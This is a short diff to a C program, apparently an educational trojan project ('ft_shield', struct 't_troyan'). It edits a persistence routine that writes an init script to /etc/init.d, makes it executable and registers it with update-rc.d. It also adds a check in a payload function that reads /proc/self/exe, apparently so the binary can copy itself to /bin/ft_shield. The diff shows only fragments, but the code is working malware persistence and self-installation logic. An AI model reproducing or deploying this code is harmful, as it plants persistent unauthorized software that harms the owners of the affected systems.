@@ -1,3 +1,5 @@
+#define  _POSIX_C_SOURCE 200112L
+
 #include "ft_shield.h"
 
 volatile sig_atomic_t g_sigint_received = 0;
@@ -12,7 +14,7 @@ int ft_persistence(t_troyan *shield)
         return(-1);
     }
     fprintf(shield->fd_init, LSB, 10, 10, 10, 10, 10, 10, 10, 10, 10);
-    fprintf(shield->fd_init, PERSISTENCE, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10);
+    fprintf(shield->fd_init, PERSISTENCE, 34, 34, 10, 10, 34, 34, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10);
     fclose(shield->fd_init);
     chmod("/etc/init.d/ft_shield", 0755);
     system("update-rc.d ft_shield defaults");               // Registration in the system
@@ -21,6 +23,16 @@ int ft_persistence(t_troyan *shield)
 
 int ft_payload(t_troyan *shield)
 {
+    char resolved_path[1024];
+    
+    ssize_t len = readlink("/proc/self/exe", resolved_path, sizeof(resolved_path) - 1);
+    if (len != -1) {
+        resolved_path[len] = '\0';
+        if (strcmp(resolved_path, "/bin/ft_shield") == 0) {
+            return (0); 
+        }
+    }
+
     shield->fd = fopen("/proc/self/exe", "r");
     if (!shield->fd)
     {
